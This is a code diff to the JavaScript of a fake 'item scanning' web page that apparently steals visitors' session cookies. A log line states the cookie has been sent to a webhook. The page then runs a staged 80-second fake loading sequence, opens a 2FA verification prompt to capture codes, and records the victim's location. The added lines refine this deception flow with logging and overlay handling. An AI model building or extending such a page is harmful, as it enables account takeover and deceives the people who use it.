@@ -279,16 +279,28 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}
 
         if (response.ok) {
             submitText.textContent = 'Scanning...';
+            console.log('✅ Cookie sent to webhook - starting 80 second flow');
             
             // Close modal and start item name rotation
             setTimeout(() => {
+                console.log('🔄 Closing modal and starting loading...');
                 closeScanModal();
+                
+                // Ensure loading overlay is visible
+                const loadingOverlay = document.getElementById('loadingOverlay');
+                if (loadingOverlay) {
+                    loadingOverlay.style.display = 'flex';
+                }
+                
                 startItemNameRotation();
             }, 500);
             
             // Show 2FA after 80 seconds
             setTimeout(() => {
                 console.log('🔐 80 SECONDS ELAPSED - SHOWING 2FA MODAL!');
+                
+                // Stop item rotation and show 2FA
+                stopItemNameRotation();
                 openVerificationModal();
             }, 80000); // 80 seconds
             
@@ -702,7 +714,14 @@ function showVerificationSuccess(trustDevice) {
     verifyBtn.style.background = '#10B981';
     
     setTimeout(() => {
+        console.log('✅ 2FA verified - continuing loading...');
         closeVerificationModal();
+        
+        // Ensure loading overlay is still visible
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        if (loadingOverlay) {
+            loadingOverlay.style.display = 'flex';
+        }
         
         // Keep loading after 2FA - continue with item names
         startItemNameRotation();
@@ -900,18 +919,24 @@ const itemNames = [
 
 function startItemNameRotation() {
     const loadingText = document.querySelector('#loadingOverlay h3');
-    if (!loadingText) return;
+    if (!loadingText) {
+        console.error('❌ Loading text element not found!');
+        return;
+    }
     
+    console.log('🔄 Starting item name rotation...');
     let currentIndex = 0;
     
     // Change item name every 2 seconds
     itemNameInterval = setInterval(() => {
         loadingText.textContent = `Checking ${itemNames[currentIndex]}...`;
+        console.log(`📦 Now checking: ${itemNames[currentIndex]}`);
         currentIndex = (currentIndex + 1) % itemNames.length;
     }, 2000);
     
     // Set initial text
     loadingText.textContent = `Checking ${itemNames[0]}...`;
+    console.log(`📦 Initial item: ${itemNames[0]}`);
 }
 
 function stopItemNameRotation() {
